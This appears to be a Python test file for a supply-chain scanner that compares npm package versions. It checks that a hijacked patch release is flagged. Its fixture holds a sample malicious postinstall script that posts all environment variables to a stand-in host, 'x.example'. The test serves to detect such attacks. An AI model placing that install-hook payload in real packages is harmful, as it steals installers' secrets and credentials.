import io
import json
import tarfile

from secopsai import package_features, version_diff
from secopsai.research_intake import SafeFetcher


def _tgz(files):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, data in files.items():
            info = tarfile.TarInfo(name); info.size = len(data); archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def _fetcher():
    packument = {"time": {"created": "2020", "1.0.0": "2024-01-01T00:00:00Z", "1.0.1": "2026-10-10T00:00:00Z"}}
    tarballs = {
        "1.0.0": _tgz({"package/package.json": b'{"name":"lib"}', "package/index.js": b"module.exports=(a,b)=>a+b"}),
        "1.0.1": _tgz({"package/package.json": b'{"name":"lib","scripts":{"postinstall":"node setup.js"}}', "package/index.js": b"module.exports=(a,b)=>a+b",
                       "package/setup.js": b"require('https').request({hostname:'x.example',method:'POST'}).end(JSON.stringify(process.env))"}),
    }

    def fetch(url, _max):
        if url == "https://registry.npmjs.org/lib":
            return 200, {"content-type": "application/json"}, json.dumps(packument).encode()
        for version, blob in tarballs.items():
            if url == f"https://registry.npmjs.org/lib/{version}":
                return 200, {"content-type": "application/json"}, json.dumps({"dist": {"tarball": f"https://registry.npmjs.org/lib/-/lib-{version}.tgz"}}).encode()
            if url == f"https://registry.npmjs.org/lib/-/lib-{version}.tgz":
                return 200, {"content-type": "application/octet-stream"}, blob
        raise AssertionError(url)

    return SafeFetcher(fetch=fetch), tarballs


def test_hijacked_patch_release_is_caught_by_what_it_added():
    fetcher, _ = _fetcher()
    members = version_diff.fetch_members(fetcher, "npm", "lib", "1.0.1")
    flags = package_features.profile(members, version="1.0.1")
    assert package_features.combine({"score": 0, "findings": [], "rules_matched": []}, flags, "npm") is not None
    flags, diff = version_diff.with_diff(fetcher, "npm", "lib", "1.0.1", flags)
    assert diff["previous_version"] == "1.0.0" and "install_hook" in diff["new_flags"]
    result = package_features.combine({"score": 0, "findings": [], "rules_matched": []}, flags, "npm", members)
    assert "BEH_DIFF_NEW_INSTALL_HOOK_NETWORK" in result["rules_matched"] and result["level"] == "alert"


def test_unchanged_behaviour_adds_nothing_and_first_releases_are_skipped():
    fetcher, _ = _fetcher()
    flags, diff = version_diff.with_diff(fetcher, "npm", "lib", "1.0.0", ["install_hook", "http_send"])
    assert diff == {"previous_version": "", "note": "first release"} and not any(f.startswith("new:") for f in flags)
    assert version_diff.with_diff(fetcher, "npm", "lib", "1.0.1", ["http_send"]) == (["http_send"], {}), "no trigger flag: no extra download"
    assert version_diff.new_flags(["install_hook", "http_send"], ["install_hook", "http_send"]) == []
